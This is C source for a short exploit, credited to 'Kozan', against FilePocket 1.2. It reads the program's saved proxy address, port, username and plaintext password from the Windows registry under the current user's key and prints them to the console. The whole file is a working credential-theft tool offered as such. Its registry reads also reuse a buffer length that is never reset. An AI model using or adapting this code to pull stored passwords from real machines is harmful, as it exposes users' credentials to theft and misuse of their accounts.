/*****************************************************************
 
FilePocket v1.2 Local Proxy Password Disclosure Exploit by Kozan
 
Application: FilePocket 1.2 (probably prior versions)
Vendor: ExoticSoft - www.exoticsoft.com
Vulnerable Description: FilePocket v1.2 discloses proxy passwords
to local users.
 
Discovered & Coded by: Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com
 
*****************************************************************/
 
#include <stdio.h>
#include <windows.h>
 
#define BUFSIZE 100
HKEY hKey;
char proxyaddr[BUFSIZE],
        proxyport[BUFSIZE],
        proxyuser[BUFSIZE],
        proxypass[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;
 
int main(void)
{
 
       if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\FilePocket\\Settings",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey) == ERROR_SUCCESS)
       {
 
			lRet = RegQueryValueEx( hKey, "ProxyAddress", NULL, NULL,(LPBYTE)
proxyaddr,&dwBufLen);
			if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ) strcpy(proxyaddr,"Not
found!");
 
			lRet = RegQueryValueEx( hKey, "ProxyPassword", NULL, NULL,(LPBYTE) proxypass,
&dwBufLen);
			if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ) strcpy(proxypass,"Not
found!");
 
			lRet = RegQueryValueEx( hKey, "ProxyUsername", NULL, NULL,(LPBYTE) proxyuser,
&dwBufLen);
			if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ) strcpy(proxyuser,"Not
found!");
 
			lRet = RegQueryValueEx( hKey, "ProxyPort", NULL, NULL,(LPBYTE) proxyport,
&dwBufLen);
			if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ) strcpy(proxyport,"Not
found!");
 
			RegCloseKey( hKey );
 
			printf("FilePocket v1.2 Local Proxy Password Disclosure Exploit by Kozan\n");
			printf("Credits to ATmaCA\n");
			printf("www.netmagister.com  -  www.spyinstructors.com\n");
			printf("kozan@netmagister.com\n\n");
			printf("Proxy Address   : %s\n",proxyaddr);
			printf("Proxy Port      : %s\n",proxyport);
			printf("Proxy Username  : %s\n",proxyuser);
			printf("Proxy Password  : %s\n",proxypass);
 
		}
		else printf("FilePocket is not installed on your system!\n");
		return 0;
}
 